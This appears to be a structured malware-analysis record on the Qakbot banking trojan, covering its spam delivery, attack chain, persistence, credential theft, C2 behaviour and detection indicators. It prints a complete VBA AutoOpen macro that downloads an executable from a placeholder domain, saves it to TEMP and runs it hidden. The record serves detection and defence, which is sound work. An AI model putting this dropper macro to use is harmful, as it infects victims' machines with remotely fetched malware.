package_info.package_manager: malware distribution via spam email (not a software package manager)
package_info.package_versions: Active since at least 2008; multiple evolving versions
package_info.why_malicious: Qakbot is a modular banking trojan and malware platform distributed via spam emails with malicious attachments and links. It is used for credential theft, lateral movement, and as a delivery platform for ransomware, impacting hundreds of thousands of systems globally.

execution_context.trigger: runtime (after user opens malicious attachment or link)
execution_context.file_location: malicious email attachment (macro-enabled document or executable payload)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: At document open (import-time), the macro downloads an executable from a remote server, writes it to disk, and executes it, resulting in initial malware infection.

malice_analysis.why_suspicious: Macros that download and execute remote binaries are a classic malware delivery technique.
malice_analysis.violated_expectations: Normal macros automate document formatting or calculations, not download and execute code.
malice_analysis.similar_legitimate_use: Automated document processing in trusted, internal environments (rare).
key_indicators: Use of CreateObject to instantiate XMLHTTP and ADODB.Stream
Saving and executing a file in the TEMP directory

malicious_snippets.code_behavior: At runtime, the malware injects code into other processes for stealth and persistence, reads credential data from the registry, and exfiltrates it to a command-and-control server.

malice_analysis.why_suspicious: Process injection and credential theft are hallmarks of advanced malware.
malice_analysis.violated_expectations: Legitimate software does not inject code into unrelated processes or exfiltrate credentials.
malice_analysis.similar_legitimate_use: Debugging tools may inject code for diagnostics (with user consent).
key_indicators: Use of OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread

execution_context.file_location: Windows registry (autorun key), scheduled tasks, or startup folder

malicious_snippets.code_behavior: At runtime, the malware creates registry autorun entries or scheduled tasks to ensure it runs on system startup, maintaining persistence.

malice_analysis.why_suspicious: Malware commonly uses autorun keys and scheduled tasks for persistence.
malice_analysis.violated_expectations: Legitimate installers may register startup tasks, but not from untrusted sources or without user consent.
malice_analysis.similar_legitimate_use: Some legitimate software (e.g., updaters) may use autorun keys.
key_indicators: Creation of scheduled tasks referencing suspicious executables

malicious_snippets.code_behavior: At runtime, the malware collects system information, sends it to a command-and-control server, receives commands (such as downloading ransomware), and executes them.

malice_analysis.why_suspicious: Unsolicited outbound connections to C2 infrastructure and remote command execution are core malware behaviors.
malice_analysis.violated_expectations: Normal software does not beacon to unknown servers or execute arbitrary remote commands.
malice_analysis.similar_legitimate_use: Remote management tools (with user consent and known infrastructure).
key_indicators: Periodic outbound connections to untrusted domains
Ability to receive and execute remote commands

attack_chain.action: User receives a spam email with a malicious attachment or link.
attack_chain.leads_to: User opens the attachment, triggering macro execution.

attack_chain.action: Malicious macro downloads and executes the Qakbot payload.
attack_chain.leads_to: Initial infection and execution of Qakbot binary.

attack_chain.action: Qakbot establishes persistence on the infected system.
Qakbot injects into other processes, steals credentials, and exfiltrates data.
Qakbot communicates with C2 servers, receives further instructions (e.g., ransomware deployment).
attack_chain.leads_to: Potential ransomware deployment or further malicious activity.

behavioral_signatures: Office documents with macros that download and execute binaries
Process injection into legitimate Windows processes
Registry or scheduled task persistence from unknown executables
Unusual outbound connections to known Qakbot C2 infrastructure
file_indicators: Executables dropped in %TEMP% or %APPDATA% directories (e.g., qakbot.exe, payload.exe)
Registry autorun keys referencing unknown executables
Scheduled tasks with suspicious names or paths
network_indicators: Connections to known Qakbot C2 domains/IPs
Beaconing to dynamic or fast-flux infrastructure
Unusual HTTP/HTTPS POST requests with system or credential data
detection_knowledge.how_to_detect: Monitor for Office documents with macros that perform network downloads and execute files. Detect process injection techniques (e.g., via Windows API calls). Alert on creation of autorun registry keys or scheduled tasks by unknown executables. Monitor outbound network traffic for connections to known Qakbot C2 infrastructure and for unusual data exfiltration patterns. Use endpoint protection and sandboxing to emulate and block Qakbot behaviors.
